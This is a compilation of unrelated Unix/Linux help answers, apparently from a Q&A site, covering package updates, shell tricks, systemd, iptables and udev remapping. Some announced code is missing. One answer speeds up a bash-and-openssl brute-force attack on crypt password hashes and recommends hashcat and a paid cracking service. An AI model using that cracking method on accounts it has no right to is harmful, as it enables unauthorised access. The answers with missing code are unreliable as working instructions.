( i solved this a while ago , just forgot to post an answer ) i ended up creating a cron job which runs everyday at 3am ( my computer stays on 24/7 ) and invokes an update script . the script contains only a couple lines and basically refreshes the repositories ( zypper ref ) and then installs all available updates ( zypper up ) . it has worked for me for the past few months .
dh_make is contained in the dh-make package . you need to install that .
just set IFS according to you needs and let the shell perform word splitting : IFS=':' for dir in $PATH; do [ -x "$dir"/"$1" ] &amp;&amp; echo $dir done  this works in bash , dash and ksh , but tested only with the latest versions .
a kernel " upgrade " was the cause of this calamity . since i installed my own , later kernel from kernel.ubuntu.com, when a " new " kernel of a different minor version was installed , everything in the world got messed up . for my purposes , i had manually installed kernel 3.7.1 , whereas the kernel provided by the ubuntu distribution is kernel 3.2.0 . this , for some reason , really botched things up , despite the fact that i was running 3.7.1 from an efi boot and there simply is not a way to boot into kernel 3.2.0 . there are incompatibilities between kernel versions and the wireless driver , but an incompatibility with the wireless driver would not cause everything to lock up and get messed up . next step for completely solving the problem would be completely preventing kernel updates from ever happening again . how can i do this ? i have heard of doing it with dpkg --set-selections , but i am not sure how to prevent updates to all linux-(headers,headers-generic,image,image-extra) packages , due to their naming : linux-headers-3.2.0-36 linux-headers-3.2.0-36-generic linux-image-3.2.0-36-generic  how do i block changes to all kernels starting with 3.2 ?
you can use something like this in your ~/.vimrc to adjust to use spaces/tabs as appropriate :
the reason this does not work is because each scriptlet ( %post , %pre , etc . ) is written as an independent script and passed to bash/sh for execution . thus the shell that executes it is unaware of any function defined in another scriptlet . i would recommend using rpm macros for this purpose . you can put them in ~/.rpmmacros or /etc/rpm/macros . something like this : %define log \ log_it() { \ log_msg=$1 \ echo -e $log_msg &gt;&gt; $log_file \ } %pre %log log_it test %post %log log_it test  see http://rpm5.org/docs/rpm-guide.pdf for more info or even /usr/lib/rpm/macros .
/etc/systemd is for user defined services . the default location for system defined services is /lib/systemd/system/ . you can overwrite system defined services in /etc/systemd . for more information about systemd either have a look at the fedora wiki page for systemd or have a look at the systemd documentation
you want to make runlevel 3 your default runlevel . from a terminal , switch to root and do the following : anything after ( and including ) the second # on each line is a comment for you , you do not need to type it into the terminal . see the wikipedia page on runlevels for more information . explanation of sed command the sed command is a stream editor ( hence the name ) , you use it to manipulate streams of data , usually through regular expressions . here , we are telling sed to replace the pattern id:5:initdefault: with the pattern id:3:initdefault: in the file /etc/inittab , which is the file that controls your runlevles . the general syntax for a sed search and replace is s/pattern/replacement_pattern/ . the -i option tells sed to apply the modifications in place . if this were not present , sed would have outputted the resulting file ( after substitution ) to the terminal ( more generally to standard output ) . update to switch back to text mode , simply press ctrl + alt + f1 . this will not stop your graphical session , it will simply switch you back to the terminal you logged in at . you can switch back to the graphical session with ctrl + alt + f7 .
Xwrits works with awesome . it is a simple command line program . here 's an example for a five-minute break with screen lock every 55 minutes : xwrits breaktime=5:00 typetime=55:00 +mouse +lock 
they look like the same command but the reason they differ is the system state has changed as a result of the first command . specifically , the first cat consumed the entire file , so the second cat has nothing left to read , hits eof ( end of file ) immediately , and exits . the reason behind this is you are using the exact same file description ( the one you created with exec &lt; infile and assigned to the file descriptor 3 ) for both invocations of cat . one of the things associated with an open file description is a file offset . so , the first cat reads the entire file , leaves the offset at the end , and the second one tries to pick up from the end of the file and finds nothing to read .
here it is
search on this opensuse page for kdesudo and you will get a list of personal repos with it .
truecrypt will not , but i do not know about nautilus . if you want to make sure , check all the files that have been modified during your session : find /tmp /var/tmp ~/ -type f -mmin 42  where 42 is the number of minutes you have been logged in ( the last command might help if you did not check the time ) . you can search for image specifically : find /tmp /var/tmp ~/ -type f \( -name '*.jpg' -o -name '*.png' \) -mmin 42  of course , if you do not trust the administrators of the computer , you will never know if they secretly keep a copy of every file that is been on the machine ever .
try : $ which startxwin  this should tell you that startxwin is here : /usr/bin/startxwin if it is not , then joseph r 's comment is probably correct and you do not have the package installed .
you can use the special atom \@&lt;= to assert a match before ( =.* to make it anywhere before in that line ) : :%s/\(=.*\)\@&lt;=pattern/saturn/g 
i guess you could run your full-screen program in tmux or screen pane directly , without additional shell session ( shell is just another program ) . another way , which i prefer , is to use tiling/stacking window manager like i3 and terminal program urxvt . the latter has very fast daemon/client structure , which allows opening new windows instantly , so you could run any program in new window this way : urxvtc -e &lt;command&gt; &lt;args&gt;  this needs to be in a script or a function , really . new window will take one half , one third , or so on of the screen in default tiling mode . combined modes are also possible in these wms .
to move files with the word in its name : find /path/to/dir1 /path/to/dir2 /and/so/on -type f -iname "*heavengames*" \ -exec mv -t /path/to/heavengames-threads {} \+  to move files with word in its body : find /path/to/dir1 /path/to/dir2 /and/so/on -type f -exec grep -q heavengames {} \; \ -exec mv -t /path/to/heavengames-threads {} \+  ps . to check that all is correct , add echo before mv at the first run .
nohup sets the default behavior of the hangup signal , which might get overriden by the application . other signals from other processes with permission ( root or same user ) or bad behavior ( seg faults , bus errors ) can also cause program termination . resource limitations ( ulimit ) can also end the program . barring these , your infinite loop might well run a very long time .
improvement #1 - loops your looping structure seems completely unnecessary if you use brace expansions instead , it can be condensed like so : i am showing 4 characters just to make it run faster , simply add additional {a..z} braces for additional characters for password length . example runs 4 characters so it completed in 18 minutes . 5 characters this took ~426 minutes . i actually ctrl + c this , so it had not finished , but i did not want to wait any more than this ! note : both these runs were on this cpu : brand = "Intel(R) Core(TM) i5 CPU M 560 @ 2.67GHz  improvement #2 - using nice ? the next logical step would be to nice the above runs so that they can consume more resources .  $ nice -n -20 ./pass.bash ab hhhhh  but this will only get you so far . one of the " flaws " in your approach is the calling of openssl repeatedly . with {a..z}^5 you are calling openssl 26^5 = 11881376 times . one major improvement would be to generate the patterns of {a..z}.... and save them to a file , and then pass this as a single item to openssl one time . thankfully openssl has 2 key features that we can exploit to get what we want . improvement #3 - our call structure to openssl the command line tool openssl provides the switches -stdin and -table which we can make use of here to have a single invoke of openssl irregardless of how many passwords we want to pass to it . this is single modification will remove all the overhead of having to invoke openssl , do work , and then exit it , instead we keep a single instance of it open indefinitely , feeding it as many passwords as we want . the -table switch is also crucial since it tells openssl to include the original password along side the ciphers version , so we can make fairly quick work of looking for our match . here 's an example using just 3 characters to show what we are changing : so now we can really revamp our original pass.bash script like so : now when we run it : $ time ./pass2.bash ab aboznNh9QV/Q2 Password: hhhhh aboznNh9QV/Q2 real 1m11.194s user 1m13.515s sys 0m7.786s  this is a massive improvement ! this same search that was taking more than 426 minutes is now done in ~1 minute ! if we search through to say " nnnnn " that is roughly in the middle of the {a..z}^5 character set space . {a..n} is 14 characters , and we are taking 5 of them . this search took ~1.1 minutes . note : we can search the entire space of 5 character passwords in ~1 minute too . $ time ./pass2.bash ab abBQdT5EcUvYA Password: zzzzz abBQdT5EcUvYA real 1m10.783s user 1m13.556s sys 0m8.251s  conclusions so with a restructuring we are running much faster . this approach scales much better too as we add a 6th , 7th , etc . character to the overall length of the password . be warned though that we are using a smallish character set , mainly only the lowercase alphabet characters . if you mix in all the number , both cases , and special characters you can typically get ~96 characters per position . this may not seem like a big deal but this increase your pool tremendously : $ echo 26^5 | bc 11881376 $ echo 96^5 | bc 8153726976  adding all those characters just increased by 2 orders of magnitude our search space . if we go up to roughly 10-12 characters of length to the password , it really puts a brute force hacking methodology out of reach . using proper a salt as well as additional nonce 's throughout the construction of a hashed password can add still more stumbling blocks . what else ? you have mentioned using john ( john the ripper ) or other cracking tools . probably the state of the art currently would be hashcat . where john is a tighter version of the approach you are attempting to use , hashcat takes it to another level by enlisting the use of gpus ( up to 128 ) to really make your hacking attempts fly . you can even make use of cloudcrack , which is a hosted version , and for a mere $17 us you can pay to have a password crack attempted . references real world uses for openssl
how about something like netstat -6tnlp | awk '/\/beam / {print $4}' | tr -d :  there is probably a neater way , and that line depends on there being only one ipv6 socket bound to a process called beam .
the r12b release is from 2008 . there was an update in how it handles odbc libs in r13a , according to the readme file from that release : this may explain why an older release is having trouble with locating the right odbc library . if you do not have any need for that specific version ( and i sincerely hope you do not ! ) , you should instead add the erlang repository to get the current release :  wget http://packages.erlang-solutions.com/erlang-solutions-1.0-1.noarch.rpm rpm -Uvh erlang-solutions-1.0-1.noarch.rpm  if you do not want do that , you could use the version in the epel repository is r14b , which is at least from this decade ( 2010 to be precise ) . to start using that repository , run  su -c 'rpm -Uvh http://download.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm'  and then try installing erlang again .
the easiest is probably to use perl 's slurp mode : perl -0777 -pi -e 's/(.*)\[end]/$1/s;s/(.*)\[end]/$1/s;s/^\s*\\n//gm' ~/.fluxbox/menu 
from :h FocusLost: *nix ( including os x ) terminals do not make their focus status known to any applications run within them so this will not work there , and indeed there is no way to make it work .
those are actually two completely different phenomena . less itself does not bother to check whether it is in the background ( this is typical of programs that interact with terminals ) . the generic terminal driver in the kernel keeps track of what process¹ is in the foreground . there can only be one foreground process ( more precisely one process group ) . the shell makes a system call ( tcsetpgrp ) when the fg builtin is used to put a process in the foreground . this system call causes the specified process to become the foreground process . when a process tries to read from a terminal² , if it is not in the foreground , the terminal driver sends the process a sigttin signal . by default , this signal suspends the process ( like a sigstop ) . similarly , a background process that tries to write to its controlling terminal receives a sigttou . most shells typically display a message like [1] + suspended (tty output) less myfile when this happens . for more information about terminals , see the description of the general terminal interface in the posix standard . ( it is not an easy read . it is a lot more than what most users and even more programmers need to know . ) a window manager does not interact with terminals , so the concept of background and foreground processes in terminals does not apply to it . what is going on there is that the x server³ terminates when the x session terminates . the script that is calling the window manager tells what to do in the session . if you put the window manager in the background and let the session script exit without waiting for the window manager , this causes the session to end earlier than you expected . ¹ what process group , actually ( e . g . a pipeline ) , but we do not need to get into this level of detail here . ² only to its controlling termina in fact . ³ the back-end part of the gui , that carries out orders to draw windows , read input and the like from applications
after searching at greater length and finding a few other sources , i think it is safe to say that gksu is nothing more than a wrapper around sudo in most cases . this source states that since gksu displays a password dialog , it is used for graphical applications ( as we already know ) because it can be used outside a terminal emulator . otherwise , running sudo &lt;cmd&gt; from a launcher would not work because the user would not be prompted for a password .
yum list installed | grep @epel 
depending on the distribution you had like to use , there are various ways to create a file system image , e.g. this article walks you through the laborious way to a " linux from scratch " system . in general , you had either create a qemu image using qemu-img , fetch some distribution 's installation media and use qemu with the installation medium to prepare the image ( this page explains the process for debian gnu/linux ) or use an image prepared by someone else . this section of the qemu wikibook contains all the information you need . edit : as gilles ' answer to the linked question suggests , you do not need a full-blown root file system for testing , you could just use an initrd image ( say , arch linux 's initrd like here )
as root user , and since fedora 20 uses systemd the more appropiated way to do this is through the hibernate target : systemctl hibernate  if you want to do this as normal user , you could use sudo and add the following line on /etc/sudoers through the visudo command : user hostname =NOPASSWD: /usr/bin/systemctl hibernate  other solution to allow hibernate with a normal user involves some thinkering with polkit . to work without further problems , i suggest you to have at least the same size of swap that you have in ram ( look at hibernation - fedora uses the same method ) .
possible solution : installing yum-plugin-downloadonly: su -c 'yum install yum-plugin-downloadonly'  downloading all python2 and python3 libraries ( make sure /tmp/cache exists ) : su -c 'yum --downloadonly --downloaddir=/tmp/cache install python-\* python3-\*'  cd /tmp/cache and remove all unneeded packages - rm !(python*.rpm) . finally , install all packages : su -c 'yum --disablerepo=* --skip-broken install \*.rpm'  this will install all packages that have dependencies due to no repository available with additional packages .
i have no idea about awk , however i know the way with shell+sed:
see if your ls has the options : if those do not help , you can make your macro work without messing up cd - by doing : (cd /rmn ; ls -l)  which runs in a subshell .
the resolution of virtual consoles can be set by adding the following lines to /etc/default/grub and then running update-grub ( maybe as root ) : GRUB_GFXMODE=1024x768x32 GRUB_GFXPAYLOAD_LINUX=keep  just change the 1024x768 to the resolution you want .
putting the configuration in ~/.bash_profile works . another option is putting the configuration in ~/.profile , but this file will be ignored if ~/.bash_profile file already exists in the filesystem .
you want to traverse a directory tree and see if it contains anything other than a directory . this is beyond rm 's capabilities . you need other tools such as find . you can delete the empty directories under a given directory this way ( -depth causes parent directories that become empty to be deleted as well ) : find "$x" -depth -type d -exec rmdir {} +  here is a function which , for each argument , deletes the argument if it is a non-directory file or a directory tree not containing anything other than directories . note that this function is not atomic : if one of the arguments changes while it is running , you may end up with an error message , but it is safe in that it will not delete any non-directory inside a directory passed as argument .
all above command does not work if you expanding existing lun or re-scaning existing lun . solution : echo "1" &gt; /sys/block/&lt;DEVICE&gt;/device/rescan  handy script : cd /dev for DEVICE in `ls sd[a-z] sd?[a-z]`; do echo '1' &gt; /sys/block/$DEVICE/device/rescan; done 
try adding /usr/sbin to your path .
awk '{s+=$3}END{print s+0}' yourfile 
you have not specified if you are using the obsolete devilspie or the newer devilspie2 . in any case , as far as i can tell from their manuals , neither one of them has access to the information you want . Devilspie is a window matching utility , it interacts with the x server . the commandline switches you give when you launch a program are not passed to the x server since they only affect the way the program is launched and are internal switches of that particular piece of software . the closest seems to be the get_application_name() call but i doubt that would include the command line arguments . you might be able to do what you need using xdotool ( see here ) and parsing the output of ps aux or pgrep -al $APP_NAME . references : devislpie manual devislpie2 manual
if your goal is to really " zero " the drive , then i bet the fastest you can get is to issue a low-level secure erase command using hdparm ( see here for step-by-step instructions ) . note two things : as hdparm manpage vividly states , the operation is " dangerous " . on the other hand , it may also repair bad blocks .
looks like ${DIRECTORY} is empty . in that case touch ${DIRECTORY}/${FILE} expands to touch /${FILE}
i use this in by .bashrc: function cd { builtin cd "$@" &amp;&amp; ls }  to disable it , you could try overriding it inside of your script : function cd { builtin cd "$@" } 
i think you can do this with pulseaudio . i found this tutorial that shows how , titled : redirect audio out to mic in ( linux ) . general steps run the application pavucontrol . go to the " input devices " tab , and select " show : monitors " from the bottom of the window . if your computer is currently playing audio , you should see a bar showing the volume of the output : &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; now start an application that can record audio such as audacity . click the input device button ( "alsa capture from" ) and pick " monitor of internal audio analog stereo" ) &nbsp ; &nbsp ; &nbsp ;
pidof = find the process id of a running program pidof finds the process id 's ( pids ) of the named programs . it prints those id 's on the standard output . this program is on some systems used in run-level change scripts , especially when the system has a system-v like rc structure . sysadmin@codewarden:~$ pidof apache2 5098 5095 5094 5092  pgrep = look up or signal processes based on name and other attributes , pgrep looks through the currently running processes and lists the process ids which matches the selection criteria . sysadmin@codewarden:~$ pgrep apache2 5092 5094 5095 5098  pgrep , ( p ) = process , grep = grep prints the matching lines want to know more about pgrep and pidof ? just run in terminal as # man pidof # man pgrep 
you could put a script in /usr/lib/systemd/systemd-sleep which execute hdparm . and you can use hdparm with /dev/disk/by-uuid/ instead of /dev/sda... or try to use /bin/sh -c "/bin/hdparm -b 200 /dev/disk/by-uuid/xy "
certainly many people have used ubuntu server with windows clients . the ubuntu server guide covers pretty much all of what you want to do . here are a few comments on your proposed setup : ditch ftp . use ssh instead . personally , i would also add that you should set up key-based authentication and disable password auth . see this page for some help . i do not see any sort of backup solution mentioned . be sure to have regular backups . consider git . i would consider using git rather than mercurial , but that is a personal preference . think about security from the start--especially if it is going to be facing the web . again see ( 1 ) . you do not need to be a security expert , but you should at least consider the following : use a firewall . with ubuntu server this is easy to do using ufw and is talked about in the guide . do not run services you do not need . specifically , i would stay away from things like phpmyadmin . do not provide access or privileges that is not needed to others . think about auditing and logging . a more general comment that i do not want to push too hard is that you might consider just moving your development process over to linux as well . in my experience , the tools available for linux make working with a remote server much smoother .
you can easily wrap up a script using find and rl ( package randomize-lines on debian ) . something along the lines of : find "$1" -type f -name *.mp3 | rl | while read FILE; do mpg123 "$FILE"; done 
you need to use xargs to turn standard input into arguments for rm . $ ls | grep '^Dar' | xargs rm  ( beware of special characters in filenames ; with gnu grep , you might prefer $ ls | grep -Z '^Dar' | xargs -0 rm  ) also , while the shell does not use regexps , that is a simple pattern : $ rm Dar*  ( meanwhile , i think i need more sleep . )
you should be able to log in as root , because usually a percentage of the partition 's size is reserved in order to always enable root login for rescue operations and such . see this u and l q and a : reserved space for root on a filesystem - why ? what you will not be able to do , however , is log in as a regular user from your display manager then switch to root or use sudo from a shell in a terminal . you have two alternatives instead : switch to a vt ( press ctrl + alt + f2 , for example ) , log in as root from there and free some space . at boot time opt for single user mode to get a root shell that would also help you free some space for your regular login . this assumes that the reason your partition was filled up is due to regular user activity and not activity by root processes . in such cases , you might need to resort to mounting the partition on a live system and freeing up the space from there . thanks to alexios ' comment for bringing this up .
with zsh ( again ) : mergecap -w Merge.pcap /mnt/md0/capture/DCN/(D.om[-15,-1])  or with gnu tools :
on ubuntu you can use evince for this . right click the file and select open with &rarr ; Document Viewer instead of the default image viewer ( eye-of-gnome ) . unfortunately evince does not have an option to easily move from one document to another . . .
terminal method usually when copying files that i think i will need to pause/resume i will go to the terminal and use the rsync command instead . $ rsync -avz &lt;source&gt; &lt;destination&gt;  this can be paused/resumed in the sense that you can simply stop it , and restart the command later on . only the files that have not been copied as of yet , will get copied during the 2nd run . the rsync tool is extremely powerful , and you can do a whole lot more with it , this is just the tip of the iceberg . gui method if you want to do this through a gui there are a number of options listed on the alternativesto .netwebsite . specifically if you look under the alternatives to supercopier , a similar tool for windows . this list provides tools that can do this for all oses . if i were to pick one , i would start with this one , ultracopier . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; backgrounding the gui another method to accomplish a pause/resume feature would be to invoke the file browser from a terminal and simply press control + z to pause the process . when you are ready to restart it , in the terminal from where it was launched , type fg to bring that process back to the foreground .
create a third , tiny , partition to hold your data . any other location on your disk will sooner or later bring trouble if indeed you cannot rely on the filesytems . sometimes the last few clusters of a disk cannot be addressed in the fat entry , that may be an option but it heavily depends on exact size of the device . does the embedded cpu / device have eeprom ? that would be an ideal place for a single byte .
ok , so i solved this problem , and you will be a bit amused about what i did wrong . first , i needed to set ge-0/0/0 ( the port that goes to the firewall ) on all of the vlans . this means that i had to create my own default vlan for the rest of the systems . so i had to do both vlan1 and vlan2 . vlan2 was used solely for wifi . once i fixed that , i had to modify my iptables rules . centos , by default , has rules inserted for accepting traffic from eth1 and eth0 . but it did not have any rules for eth1.2 . so i had to add the iptables rules that would allow traffic in on that interface ( i also had to update the forwarding rules ) .
this is as simple as it could be . you do not need any bridging . just masquerade your local network on rpi : iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE enable forwarding of traffic : echo 1 &gt; /proc/sys/net/ipv4/ip_forward rpi will not work as invisible bump-on-the-wire but will need a network setup between it and your private router – which will use ip address of rpi 's eth0 as gateway . so it will look like this : (RPi wlan0) -- MASQUERADE -- (RPi eth0;192.168.99.254/24) \u2192 (WAN on Private Router,192.168.99.1/24) cheers ,
just in case anyone else ever has to the same thing i did here , i will answer my own question . 1 ) get the binary dvd iso image from redhat . com 2 ) remove unnecessary rpms ( GNOME , eclipse ) so that it is less than 4gb ( this allows it to be stored on a fat32 filesystem ) -copy this iso onto a usb 3 ) remove the iso image that comes with the previous bootable usb 4 ) now plug in the bootable usb ( the one with the boot files but no iso image ) to the target machine 5 ) you will run into a " missing iso 9660 error " which you then plug in and mount the usb with the newer version of redhat 6 ) once installation has completed , copy the /root/install . log 7 ) slim the redhat iso further by incorporating only the rpms found in the install . log 8 ) copy this slimmer redhat iso onto the bootable usb and you will have a bootable usb that uses the new rpms ( updated os )
so i have to come back on this because i found a " better " solution ( imho ) without lirc ! as i said , the first time i connected the usb receiver , almost all buttons on the remote was working , without any other software nor any configuration . on different advice ( not only here ) , i installed lirc and plugins i found for the software i use the most often . after some difficulties , i configured lirc in the sense that the computer was receiving scancode and they was translated . after this , i started " totem " and activate the lirc plugin . . . and nothing work anymore ! ! ! :- ( even not the key which was working before same thing with banshee or vlc ! however , when i closed the application or disable the lirc plugin , my key works again and i can set the volume , start , stop and pause any mp3 or video . . . etc . as i understood , making the remote being recognized by lirc is not enough , i had to write a configuration file for each and every program i would like to use . . . even for keys which was working without lirc . sound crazy . . . without talking about the fact that finding accepted lirc actions by every plugin seems rather difficult and some software ( like banshee by example ) do not offer more possibilities than those i already had without lirc ( even less ) . so i searched . . . first find , since kernel 2.6.36 , the drivers of lirc are integrated . this is the reason why , when i configured lirc , i had to use " devinput " driver . since this version , all remote control are recognized as external keyboard ! this explain also why most of the keys was working out of the box . so , as it is a keyboard , what we have to do is to " remap " the non working key on another code/action . this is how : start by doing an " lsusb " and identify your remote controller : Bus 006 Device 002: ID 13ec:0006 Zydacron HID Remote Control  you must write down the id 13ec:0006 , it will be useful . now display the content of /dev/input/by-id in long format . ls -l /dev/input/by-id/ lrwxrwxrwx 1 root root 10 Apr 15 19:27 usb-13ec_0006-event-kbd -&gt; ../event10  you find the correct line thanks to the id and then the event associated to it ! now , with this information , we will try to read from the remote sudo /lib/udev/keymap -i input/event10  when you press a key on the remote , you should see the scan code and the currently associated keycode : beware some key may return a keycode but this keycode may not be recognized by your window manager ( gnome3 in my case ) . or the keycode is not correct . in my case , i had to remap the key number to keypad ( belgium keyboard ) and the special key ( audio , video , dvd , . . . ) to some unused function key . now we will write our keymap file . you can use any name , in my case , i name it ' zydacron ' sudo vi /lib/udev/keymaps/zydacron  there is already several files in this folder . the format is very simple : &lt;scan code&gt; &lt;keycode&gt; &lt;# comment eventually&gt;  example : 0x70027 kp0 0x7001E kp1 0x7001F kp2 0xC0047 f13 # music 0xC0049 f14 # photo 0xC004A f15 # video 0xC00CD playpause # Play/Pause  you can put only key which need to be remapped ! you will find on this page the official list of all key code . again , it does not means that every key code on this list is supported by your window manager , you will have to test to be sure . when the file is done , we can test it with : sudo /lib/udev/keymap input/event10 /lib/udev/keymaps/zydacron  if something does not work , you will have to try another keycode . and then redo the mapping . when everything works as you expect , we will make it permanent . edit the file /lib/udev/rules . d/95-keymap . rules sudo vi /lib/udev/rules.d/95-keymap.rules  in the file after label="keyboard_usbcheck " but before goto="keyboard_end " add the following line : ENV{ID_VENDOR_ID}=="13ec", ENV{ID_MODEL_ID}=="0006", RUN+="keymap $name zydacron"  you can recognize the vendor id and model id as the 2 parts of the id found with lsusb , and also the name of my file . adapt it to your own values . restart the udev process : sudo service udev restart  ( or reboot your computer ) , and you are done . now each time , you plug your receiver , no matter on which usb port nor the event number given by the system , the mapping will be done automatically little tip :i mapped one key as " tab " and another as " f10" , very useful in banshee , to " jump " across sub-window and to open the main menu . hope it help
check the mode at which the partition is mounted i.e. whether it is mounted in read-only or read-write mode . you can use mount command to check that . if this is the issue , then you can edit the /etc/fstab file .
the set command shows all variables ( and functions ) , not just the exported ones , so set | grep EUID  will show you the desired value . this command should show all the non-exported variables : comm -23 &lt;(set | grep '^[^=[:space:]]\+=' | sort) &lt;(env | sort) 
you can use yum rep which updated version of mysql , as in here : http://www.webtatic.com/packages/mysql55/
pb-bsd is freebsd with many enhancements to make a convenient , comfortable desktop environment , their " push button installer " package management tool , a network utility and a unified control panel for easy access to admin utilities . so , yes , freebsd can be made to work like pc-bsd - that is exactly what the pc-bsd team have done ! if you want a graphical desktop system to get you started learning *bsd , then i would think pc-bsd is the ideal place to start - it gets you up and running with one of several popular desktop environments from the get-go , so you can then focus on learning other aspects of the system . if , on the other hand , you want to get your hands dirty from the beginning , learning how to install freebsd and additional software , you can use the ports system to add the extras you want . as for the documentation , the vast majority of documentation relevant to freebsd will also apply to pc-bsd without modification , so the pc-bsd team focus their efforts on documenting the differences . you can install pbi packages on a freebsd system - simply install the ports-mgmt/pbi-manager port , which provides the command line utilities for managing pbi packages . there is also sysutils/easypbi , which aims to provide a simple interface for creating pbi modules from freebsd ports . there are also ports of the pc-bsd network utility , their warden jail utility and others .
if you just need any 2.6.34-kernel , you might head over to koji and try to find a precompiled one for you version of fedora . you can install it as root after downloading all required rpms with yum localinstall kernel-*.rpm and it will automatically appear in grub . if you need to modify the kernel , it is best to also start with the distribution kernel and modify it to suit your needs . there is an extensive howto in the fedora wiki . lastly if you really need to start from scratch with the sources from kernel . org , you have to download the source and extract the archive . then you have to configure the kernel . for this , say make menuconfig for a cli or make menuconfig for a graphical configuration . you might want to start with the old configuration of the running kernel , see stackexchange-url when you are finished configuring , say make to build the kernel , then make modules to build kernel modules . the following steps have to be done as root : say make modules_install to install the modules ( this will not overwrite anything of the old kernel ) and finally make install which will automatically install the kernel into /boot and modify the grub configuration , so that you can start the new kernel alongside the old one .
we have figured out that the problem is with squashfs itself . it has no support for bad block detection , as stated here : http://elinux.org/support_read-only_block_filesystems_on_mtd_flash so the possible solution is to use another filesystem or use ubi to manage the bad blocks and then keep using squashfs .
i think it is not possible . this behavior is hardcoded . when you are opening your desktop in the way that you showed on first screenshot you are opening location desktop:/ ( you can type that address in uri bar in konqueror or dolphin to check it ) . handler for this pseudoprotcol is kde component ( kioslave ) named kio_desktop . when you open normal location dolphin is using kioslave kio_file ( for file:/ protocol ) . in source code of kio_desktop there is a special function that is responsible for handling desktop files . in line 229 you can find code that hide extension by removing last 8 characters from displayed filename . in code of kio_file there is no reference to desktop file , so i am assuming that kio_file treats .desktop as normal files .
method #1 - vnc from computera -> b where a user is already logged in on b you do not specify what vnc client you are using but one of the more popular ones is vinagre . it is typically included with gnome desktop based distros , which should cover most of the larger distros . installation first you will want to make sure that you have gnome 's vnc client , vinagre installed as well as the vnc server , vino . on my fedora 19 system these packages required installation . $ sudo yum install vinagre vino  on ubuntu you had install the same packages , using apt . $ sudo apt-get install vinagre vino  server setup once installed you will want to make sure that the vnc server is running on computer b . you can do this either by navigating through settings -> sharing menu from where you can select to enable " screen sharing " . fedora &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; ubuntu &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; note : you can invoke vino 's preferences from the command line like so :  $ vino-preferences  client setup once the vnc server 's been setup on computer b , you should now be able to connect to it from computer a , using vinagre , the vnc client . you can do this either from the command line like so : $ vinagre vnc://greeneggs.bubba.net  where the vnc://... is the server string provided by vino , as in the screenshot above . additional notes if you need to summon the vnc server 's dialog directly from the command line it is called vino-preferences . vinagre is also a gui that can be launched bare , and bookmarks can be maintained for vnc severs that you may frequent . to launch it use the command vinagre . &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; method #2 - vnc from computera -> b where a user is not already logged in on b server setup ubuntu install x11vnc $ sudo apt-get install x11vnc  create /etc/init/x11vnc.conf file . after restarting ( rebooting ) , x11vnc should be listening on the standard vnc port , 5900 . you can confirm note : the script is based on an upstart event mechanism where lightdm emits login-session-start events , x11vnc is then started . references remote vnc login to ubuntu 11.10 remote vnc login to ubuntu 12.04
you define your own conventions , but i would indeed stay away from /usr/include . /usr/lib/&lt;lang&gt; seems popular here for interpreted languages ( i have at least /usr/lib/python , /usr/lib/perl and /usr/lib/ruby with variants for the handling of version specific stuff ) i think that /usr/share/&lt;lang&gt; is more proper from the fhs ( i have also /usr/share/tcl with a symbolic link from /usr/lib/tcl ) if there is no binary data there ( or at least only architecture independent binary data ) . still in the fhs spirit , i would tend to use /opt/&lt;lang&gt;/share or /opt/&lt;lang&gt;/lib while providing the installer ( or the distribution ) an easy way to use /usr/share/&lt;lang&gt; or /usr/lib/&lt;lang&gt; .
looking at ~/.config/terminator/config , for some reason it was using &lt;Primary&gt; instead of &lt;Ctrl&gt; . after deleting the keybindings section , the original shortcut Shift+Ctrl+I for new window works .
you did not give many details about your network setup , but assuming that the iptables configuration is on host " a " and you tried to ping from host " b " , then here 's the answer . you configured iptables to allow tcp ports 22 and 80 . all other traffic is blocked because iptables interprets the configuration from the top and you have :INPUT DROP [0:0]  set . icmp is a different protocol , and you have to explicitly allow it in order to be able to ping the machine : iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -d YOUR_IP -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT  edit : your edit in the original question showed that you are trying to access hosts from the host you have configured iptables . so you have to tell iptables to accept packets that are part of an existing connection : iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 
you are comparing apples to oranges . top is displaying what proportion of your computer 's cpu power that process used during the last sampling interval ( a few seconds , usually ) . ps , with %C , is displaying what proportion of the time that process was running over that process 's lifetime . because of the way process statistics are gathered , any command that does display cpu usage over the past few seconds has to run for a few seconds , and ps does not have any options to do that . you can however use top in batch mode , top -b -n 2 -d 0.001 . it will pause gathering data , and then give its listing over stdout . this will allow you to parse top output or use it in scripts .
i found this document which explains exactly what i was looking for , i hope it is useful for some of you http://www.linuxtopia.org/online_books/linux_kernel/kernel_configuration/ch08s02.html read the entire document , it is full of nice things , specially this : when the topic of this book was first presented to me , i dismissed it as something that was already covered by the plentiful documentation about the linux kernel . surely someone had already written down all of the basics needed in order to build , install , and customize the linux kernel , as it seemed to be a very simple task to me . after digging through the different howtos and the linux kernel documentation directory , i came to the conclusion that there was not any one place where all of this information could be found . it could be gleaned by referencing a few files here , and a few outdated websites there , but this was not acceptable for anyone who did not know exactly what they were looking in the first place . so this book was created with the goal of consolidating all of the existing information already scattered around the internet about building the linux kernel , as well as adding a lot of new and useful information that was not written down anywhere but had been learned by trial and error over my years of doing kernel development . my secret goal of this book is to bring more people into the linux kernel development fold . the act of building a customized kernel for your machine is one of the basic tasks needed to become a linux kernel developer . the more people that try this out , and realize that there is not any real magic behind the whole linux kernel process , the more people will be willing to jump in and help out in making the kernel the best that it can be .
the reason that installing command-not-found did not start providing suggestions for non-installed packages was that i had missed a small notification from dpkg as part of the install . one is supposed to run the command update-command-not-found immediately after running apt-get install command-not-found . in fact dpkg prompts for running this command .
